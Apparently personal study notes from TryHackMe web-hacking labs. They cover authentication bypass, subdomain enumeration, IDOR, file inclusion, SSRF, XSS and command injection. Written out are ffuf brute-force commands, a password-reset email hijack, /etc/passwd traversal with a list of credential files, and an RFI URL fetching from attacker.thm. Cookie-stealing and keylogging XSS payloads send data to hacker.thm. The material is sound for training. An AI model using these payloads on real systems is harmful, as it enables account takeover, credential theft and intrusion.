Authentication Bypass
https://github.com/ffuf/ffuf

Username Enumeration 
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"

Brute Force 
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

Logic Flaw 
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

Cookie Tampering 
curl http://MACHINE_IP/cookie-test
curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-tes

----------------------------------------------------------------
Subdomain Enumeration

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
{Brute Force, OSINT (Open-Source Intelligence) and Virtual Host}
----------------------------------------------------------------

SSL/TLS Certificates
crt.sh

Search Engines
-site:www.tryhackme.com  site:*.tryhackme.com

DNS Brute Force 
dnsrecon -t brt -d example.com

OSINT (Open-Source Intelligence)
Sublist3r, 
./sublist3r.py -d example.com

Virtual Host
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

IDOR - Insecure Direct Object Reference
---------------------------------------
Decode or change user ID
eg  browser developer tools, select the network tab and then refresh the page find user ID in response tab
https://www.base64decode.org/ 
https://crackstation.net/ 

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

File inclusion
Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal

Directory traversal
http://webapp.thm/get.php?file=../../../../etc/passwd


/etc/issue  contains a message or system identification to be printed before the login prompt.

/etc/profile  controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived

/proc/version  	                specifies the version of the Linux kernel

/etc/passwd                    	has all registered user that has access to a system

/etc/shadow                    	contains information about the system's users' passwords

/root/.bash_history             contains the history commands for root user

/var/log/dmessage    	          contains global system messages, including the messages that are logged during system startup

/var/mail/root                  all emails for root user

/root/.ssh/id_rsa              	Private SSH keys for a root or any known valid user on the server

/var/log/apache2/access.log     the accessed requests for Apache  webserver

C:\boot.ini                      contains the boot options for computers with BIOS firmware


xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Remote File Inclusion - RFI

Sensitive Information Disclosure, Cross-site Scripting (XSS), Denial of Service (DoS)

http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt


xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

SSRF  (Server-Side Request Forgery)
    Access to unauthorised areas.
    Access to customer/organisational data.
    Ability to Scale to internal networks.
    Reveal authentication tokens/credentials.
requestbin.com
https://website.th./item/2?server=server.website.thm/flag?id=9&x=

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Cross-site Scripting

 XSS Payloads 
 <script>alert('XSS');</script>
Session Stealing:
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
Key Logger
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
Business Logic
<script>user.changeEmail('attacker@hacker.thm');</script>



Reflected XSS
https://website.com/?error=<script src="https://attacher.thm/evil.js"></script>

Stored XSS
XSS payload is stored on the web application (in a database, for example)


DOM Based XSS
Document Object Model and is a programming interface for HTML and XML documents
Eg. window.location.hash, window.location.x

Blind XSS
Blind XSS is similar to a stored XSS (which we covered in task 4)
https://github.com/mandatoryprogrammer/xsshunter-express

</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
nc -nlvp 9001


xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Command Injection

Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running 

Linux
Payload	        Description
whoami	        See what user the application is running under.
ls	            List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.
ping	        This command will invoke the application to hang. This will be useful in testing an application for blind command injection.
sleep	        This is another useful payload in testing an application for blind command injection, where the machine does not have ping installed.
nc	            Netcat can be used to spawn a reverse shell onto the vulnerable application.

Windows

Payload	        Description
whoami	        See what user the application is running under.
dir	            List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.
ping	        This command will invoke the application to hang. This will be useful in testing an application for blind command injection.
timeout	        This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the ping command is not installed.


xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





























































